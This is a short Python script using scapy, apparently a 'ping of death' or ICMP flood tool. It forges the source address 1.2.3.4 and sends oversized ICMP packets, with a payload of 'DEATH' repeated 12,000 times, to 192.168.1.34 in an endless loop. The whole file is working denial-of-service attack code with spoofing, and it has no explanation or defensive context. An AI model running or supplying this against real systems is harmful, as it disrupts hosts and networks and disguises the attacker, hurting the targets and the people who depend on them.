from scapy.all import *

D = "DEATH"
ip = IP(src = '1.2.3.4', dst = '192.168.1.34')
ping =  ip/ICMP()/(D*12000)
while True:
    send(ping)
